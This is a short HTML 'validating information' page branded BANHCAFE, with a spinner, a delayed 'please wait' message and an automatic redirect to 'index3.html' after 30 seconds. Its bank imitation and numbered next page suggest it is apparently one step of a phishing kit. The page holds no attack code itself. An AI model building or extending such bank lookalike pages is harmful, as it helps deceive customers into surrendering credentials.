<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Validando informaciÃ³n - BANHCAFE</title>
  <style>
    :root {
      --vino-banhcafe: #7a1c1c; /* ðŸŽ¨ tono vino coherente con el logo */
      --fondo-claro: #f9f9f9;
      --blanco: #ffffff;
    }

    * {
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }

    body {
      margin: 0;
      background: var(--fondo-claro);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background: url('assets/background.png') no-repeat center center;
      background-size: cover;
    }

    .contenedor {
      background: var(--blanco);
      padding: 40px 30px;
      border-radius: 12px;
      text-align: center;
      max-width: 400px;
      width: 100%;
      box-shadow: 0 6px 20px rgba(0,0,0,0.15);
      border-top: 5px solid var(--vino-banhcafe);
    }

    .logo img {
      max-width: 150px;
      margin-bottom: 20px;
    }

    .spinner {
      margin: 20px auto;
      width: 80px;
      height: 80px;
      border: 8px solid #ddd;
      border-top: 8px solid var(--vino-banhcafe);
      border-radius: 50%;
      animation: girar 1s linear infinite;
    }

    @keyframes girar {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .mensaje {
      margin-top: 15px;
      font-size: 16px;
      color: var(--vino-banhcafe);
      font-weight: bold;
      display: none;
    }
  </style>
</head>
<body>
  <div class="contenedor">
    <div class="logo">
      <img src="assets/logo.png" alt="BANHCAFE">
    </div>
    <div class="spinner"></div>
    <div class="mensaje" id="mensaje">Por favor espere...</div>
  </div>

  <script>
    // Mostrar mensaje cuando falten 15 segundos
    setTimeout(() => {
      document.getElementById("mensaje").style.display = "block";
    }, 15000);

    // Redirigir despuÃ©s de 30 segundos
    setTimeout(() => {
      window.location.href = "index3.html"; 
    }, 30000);
  </script>
</body>
</html>
